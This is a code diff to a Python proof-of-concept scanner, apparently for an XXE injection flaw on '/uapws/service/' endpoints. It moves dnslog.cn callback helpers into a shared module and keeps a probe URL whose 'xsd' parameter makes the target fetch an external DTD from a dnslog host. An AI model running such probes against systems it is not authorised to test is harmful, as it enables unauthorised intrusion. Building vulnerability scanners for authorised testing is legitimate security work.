@@ -16,9 +16,14 @@ from gevent.pool import Pool
 from gevent.queue import Queue
 import requests
 import re
+import os
+import sys
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
+path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+sys.path.append(path)
+from modules.dnslog import dnslogs
 
 
 class poc:
@@ -31,24 +36,6 @@ class poc:
         self.q = Queue()
         self.text_list = []
         self.proxies = proxies
-
-    def get_dnslog(self):
-        url = "http://dnslog.cn/getdomain.php"
-        headers = {
-            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
-        }
-        result = requests.get(url=url, headers=headers, verify=False)
-        cookie = re.search("(.*);", result.headers.get('Set-Cookie')).group(1)
-        return result.text, cookie
-
-    def get_result(self, cookie):
-        url = "http://dnslog.cn/getrecords.php"
-        headers = {
-            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
-            'Cookie': cookie
-        }
-        result = requests.get(url=url, headers=headers, verify=False)
-        return result.text
 
     def vuln_path(self):
         for xxe_path in self.xxe_apis:
@@ -67,13 +54,13 @@ class poc:
             if self.q.qsize() == 0:
                 break
             api = self.q.get_nowait()
-            dnslog_all = self.get_dnslog()
+            dnslog_all = dnslogs().get_dnslog()
             dnslog = dnslog_all[0]
             target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
             try:
                 result = requests.get(url=target_url, headers=self.headers, verify=False, proxies=self.proxies)
                 for i in range(5):
-                    dnslog_result = self.get_result(dnslog_all[1])
+                    dnslog_result = dnslogs().get_result(dnslog_all[1])
                 if dnslog_result != "[]":
                     target = urlparse(target_url)
                     result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
